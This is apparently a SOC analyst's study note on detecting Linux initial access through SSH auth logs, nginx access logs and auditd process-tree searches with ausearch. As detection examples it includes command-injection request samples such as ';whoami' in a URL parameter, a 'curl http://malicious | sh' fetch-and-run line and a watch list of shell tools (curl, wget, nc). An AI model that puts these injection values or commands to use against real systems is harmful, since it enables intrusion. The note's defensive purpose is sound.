# Linux Threat Detection 1

## Overview
Focused on detecting **Initial Access** techniques on Linux systems using:
- SSH authentication logs (`/var/log/auth.log`)
- Web server logs (`/var/log/nginx/access.log`)
- auditd process creation logs
- Process tree analysis

---

# MITRE ATT&CK

## Initial Access
- **T1133 - External Remote Services**
  - SSH exposed to the Internet
  - Similar concept to exposed RDP on Windows
  - Common entry point for attackers

- **T1190 - Exploit Public-Facing Application**
  - Vulnerable web applications
  - Command injection
  - Vulnerable CMS/plugins
  - Docker API exposure
  - Firewall vulnerabilities

---

# Initial Access via SSH

## Common Causes

### SSH Key Compromise
- Private keys leaked in:
  - Git repositories
  - Automation servers
  - Configuration backups
- Admin workstation infected
- SSH keys stolen

### Weak Passwords
Examples:
- Temporary weak passwords never removed
- Contractor accounts
- Password reuse
- Old SSH servers exposed to the Internet

# SSH Detection

## Main Log

```bash
/var/log/auth.log
```

---

## Successful SSH Logins

```bash
grep "Accepted" /var/log/auth.log
```

Look for:

- Username
- Source IP
- Authentication method
- Time
- Frequency

Example:

```text
Accepted publickey for ansible
Accepted password for jsmith
```

---

## Authentication Methods

### Good

```
Accepted publickey
```

Usually:
- automation
- administrators
- internal systems

---

### Higher Risk

```
Accepted password
```

Especially when:

- External IP
- Unusual time
- New country
- Unexpected user

---

# SSH Brute Force Indicators

Classic pattern:

Many:

```
Failed password
```

Followed by:

```
Accepted password
```

Potential compromise.

Questions to ask:

- Was brute force seen beforehand?
- Is source IP trusted?
- Is login normal?
- What happened immediately afterwards?

# Web Log Analysis

Main log:

```bash

```

---

## Command Injection

Normal request:

```text
GET /ping?host=8.8.8.8
```

Suspicious:

```text
GET /ping?host=whoami
```

or

```text
GET /ping?host=;whoami
```

or

```text
GET /ping?host=;ls
```

Indicators:

- Linux commands inside URL parameters
- Unexpected HTTP 200 responses
- Repeated command execution

# auditd Process Analysis

Instead of relying only on application logs, SOC analysts often investigate:

## Process Trees

Trace a suspicious command back to its origin.

Example:

```
whoami
    ↑
/bin/sh
    ↑
python app.py
    ↑
systemd (PID 1)
```

This quickly identifies which application launched the command.

---

# ausearch Commands

Search for command execution

```bash
ausearch -i -x whoami
```

---

Find parent process

```bash
ausearch -i --pid <PID>
```

---

Find child processes

```bash
ausearch -i --ppid <PID>
```

Useful for discovering everything an application executed.

---

# Key Fields

## PID

Process ID

Current process.

---

## PPID

Parent Process ID

Used to build process trees.

---

## proctitle

Shows actual executed command.

Example:

```text
/bin/sh -c whoami
```

---

# Process Tree Investigation Workflow

1. Detect suspicious command

```bash
ausearch -i -x whoami
```

↓

2. Record PPID

↓

3. Search parent

```bash
ausearch -i --pid <PPID>
```

↓

4. Continue until reaching original application

↓

5. Enumerate all child processes

```bash
ausearch -i --ppid <Application PID>
```

Look for:

- curl
- wget
- bash
- sh
- nc
- python
- reverse shells

---

# Reverse Shell Indicators

Suspicious children may include:

```text
curl http://malicious | sh
```

or

```text
wget ...
```

or

```text
nc
```

These strongly suggest successful exploitation.

# SOC Detection Checklist

✅ Multiple failed SSH logins

✅ Successful login after brute force

✅ Password authentication from external IP

✅ Logins at unusual hours

✅ Linux commands inside HTTP parameters

# Memory Hooks

- **SSH attack?** → `/var/log/auth.log`
- **Web exploit?** → `/var/log/nginx/access.log`
- **Who launched the command?** → `ausearch`
- **Trace parent process?** → `--pid`
- **List child processes?** → `--ppid`
- **Password login after many failures = likely brute-force compromise**
- **Web app spawning shell commands = likely command injection / application compromise**
